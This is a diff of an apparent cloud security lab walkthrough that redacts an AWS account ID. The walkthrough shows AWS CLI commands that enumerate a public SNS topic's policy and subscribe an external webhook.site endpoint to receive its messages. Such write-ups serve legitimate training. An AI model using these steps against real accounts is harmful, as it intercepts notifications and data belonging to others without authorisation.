@@ -97,17 +97,17 @@ Since we have few permissions on SNS, lets try to see what we can find.
 ![sns list topics](image-4.png)
 We can use the following command to get more information about the topic
 ```bash
-aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:139343766080:public-topic-cgidhisns60b90 --profile sns_user
+aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:1234567890:public-topic-cgidhisns60b90 --profile sns_user
 ```
 This gives an access control policy which allows anyone to subscribe to the topic and some other attributes
 ```json
 {
     "Attributes": {
-        "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":[\"sns:Subscribe\",\"sns:Receive\",\"sns:ListSubscriptionsByTopic\"],\"Resource\":\"arn:aws:sns:us-east-1:139343766080:public-topic-cgidhisns60b90\"}]}",
+        "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":[\"sns:Subscribe\",\"sns:Receive\",\"sns:ListSubscriptionsByTopic\"],\"Resource\":\"arn:aws:sns:us-east-1:1234567890:public-topic-cgidhisns60b90\"}]}",
         "LambdaSuccessFeedbackSampleRate": "0",
-        "Owner": "139343766080",
+        "Owner": "1234567890",
         "SubscriptionsPending": "0",
-        "TopicArn": "arn:aws:sns:us-east-1:139343766080:public-topic-cgidhisns60b90",
+        "TopicArn": "arn:aws:sns:us-east-1:1234567890:public-topic-cgidhisns60b90",
         "EffectiveDeliveryPolicy": "{\"http\":{\"defaultHealthyRetryPolicy\":{\"minDelayTarget\":20,\"maxDelayTarget\":20,\"numRetries\":3,\"numMaxDelayRetries\":0,\"numNoDelayRetries\":0,\"numMinDelayRetries\":0,\"backoffFunction\":\"linear\"},\"disableSubscriptionOverrides\":false,\"defaultRequestPolicy\":{\"headerContentType\":\"text/plain; charset=UTF-8\"}}}",
         "FirehoseSuccessFeedbackSampleRate": "0",
         "SubscriptionsConfirmed": "0",
@@ -121,7 +121,7 @@ This gives an access control policy which allows anyone to subscribe to the topi
 ```
 We can [subscribe](https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html) to the topic with an http webhook to see what messages we receive.
 ```bash
-aws sns subscribe --topic-arn arn:aws:sns:us-east-1:139343766080:public-topic-cgidhisns60b90 --protocol https --notification-endpoint https://webhook.site/8598152c-ae9a-499a-923b-88d36987e9cf  --profile sns_user
+aws sns subscribe --topic-arn arn:aws:sns:us-east-1:1234567890:public-topic-cgidhisns60b90 --protocol https --notification-endpoint https://webhook.site/8598152c-ae9a-499a-923b-88d36987e9cf  --profile sns_user
 ```
 ![subscribed](image-5.png)
 We receive a SubscribeURL which we have to visit to confirm the subscription.
